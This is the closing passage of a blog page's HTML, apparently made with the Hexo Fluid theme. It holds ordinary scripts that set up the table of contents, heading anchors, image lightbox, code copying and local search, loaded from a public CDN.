      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
